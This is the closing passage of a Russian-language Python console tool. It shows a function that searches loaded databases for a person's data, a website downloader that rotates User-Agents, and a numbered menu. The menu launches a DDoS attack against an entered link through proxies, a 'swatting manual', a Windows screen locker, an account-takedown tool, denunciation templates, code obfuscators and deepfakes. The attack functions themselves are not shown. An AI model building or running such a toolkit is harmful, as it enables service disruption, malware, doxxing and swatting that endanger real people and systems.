            filepath = os.path.join(directory, filename)
            if os.path.isfile(filepath):
                ext = os.path.splitext(filename)[1].lower()
                if ext == ".csv":
                    futures.append(executor.submit(search_in_csv, filepath, data_to_find_re))
                elif ext in [".xls", ".xlsx"]:
                    futures.append(executor.submit(search_in_excel, filepath, data_to_find))
                elif ext == ".txt":
                    futures.append(executor.submit(search_in_txt, filepath, data_to_find_re))

        for future in futures:
            result = future.result()
            if result:
                print(result)
                found = True

    end_time = time.time()
    time_taken = end_time - start_time
    print(color_text + f"[*] Поиск данных завершен за {time_taken:.2f} секунд.")

    if not found:
        print(error_text_color + "[!] Данные не найдены ни в одном файле.")
        select()

    select()

def download_website(url, mobile=False):
    try:
        with open("files/useragent.txt", "r") as f:
            user_agents = [line.strip() for line in f]

        if not user_agents:
            raise ValueError(error_text_color + "[!] Файл useragent.txt пуст или не содержит валидных User-Agent строк.")

        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}

        if mobile:
            url += "?m=1"

        response = requests.get(url, headers=headers)
        response.raise_for_status()

        dirname = urlparse(url).netloc.replace(".", "_")
        os.makedirs(dirname, exist_ok=True)

        with open(os.path.join(dirname, "index.html"), "w", encoding="utf-8") as f:
            f.write(response.text)

        soup = BeautifulSoup(response.content, "html.parser")
        links = soup.find_all(["link", "script", "img"])

        for link in links:
            if link.name == "link" and link.get("href"):
                href = urljoin(url, link.get("href"))
                download_resource(href, dirname, "css" if link.get("rel") == "stylesheet" else "other")
            elif link.name == "script" and link.get("src"):
                src = urljoin(url, link.get("src"))
                download_resource(src, dirname, "js")
            elif link.name == "img" and link.get("src"):
                src = urljoin(url, link.get("src"))
                download_resource(src, dirname, "img")

    except requests.exceptions.RequestException as e:
        print(error_text_color + f"[!] Ошибка при скачивании: {e}")
    except Exception as e:
        print(error_text_color + f"[!] Произошла ошибка: {e}")

    select()


def download_resource(url, base_dir, resource_type):
    try:
        response = requests.get(url)
        response.raise_for_status()

        resource_dir = os.path.join(base_dir, resource_type)
        os.makedirs(resource_dir, exist_ok=True)

        filename = os.path.basename(urlparse(url).path)
        filepath = os.path.join(resource_dir, filename)
        with open(filepath, "wb") as f:
            f.write(response.content)
        print(color_text + f"[+] Ресурс сохранен: {filepath}")
    except requests.exceptions.RequestException as e:
        print(error_text_color + f"[!] Ошибка при скачивании ресурса {url}: {e}")
    except Exception as e:
        print(error_text_color + f"[!] Произошла ошибка при сохранении ресурса {url}: {e}")

def main():
    print(color_text + banner)
    select()

def select():
    select = input(color_text + "[?] выбор > ")

    if select == '1':
       phone_input()
    elif select == '2':
        phone_info = PhoneNumberInfo()
        phone_info.print_number_info()
    elif select == '3':
        ip_select()
    elif select == '4':
        domain_info()
    elif select == '5':
        Data_load = input(color_text + r"""
        Скопируйте ваши бд в папку:
        files\base
        Подерживаемые форматы:
        .csv
        .xls, .xlsx
        .txt
        Если все бд загружены нажмите enter
            """)
        data_to_find = input(color_text + "[?] Искомые данные > ")
        find_data_in_files(data_to_find)
    elif select == '6':
        banword()
    elif select == '7':
        donos_menu()
    elif select == '8':
        obf_py()
    elif select == '9':
        obf_bat()
    elif select == '10':
        swatting_manual()
    elif select == '11':
        scan_ports()
    elif select == '12':
        link = input(color_text + '[?] Введите ссылку > ')
        start_ddos_attack('files/useragent.txt', 'files/proxy.txt', link)
    elif select == '13':
        password_generator()
    elif select == '14':
        win_locker()
    elif select == '15':
        snoser()
    elif select == '16':
        deep_fake()
    elif select == '17':
        url = input(color_text + "[?] Введите URL сайта > ")
        download_website(url)
    elif select == '0':
        exit(0)

if __name__ == "__main__":
    main()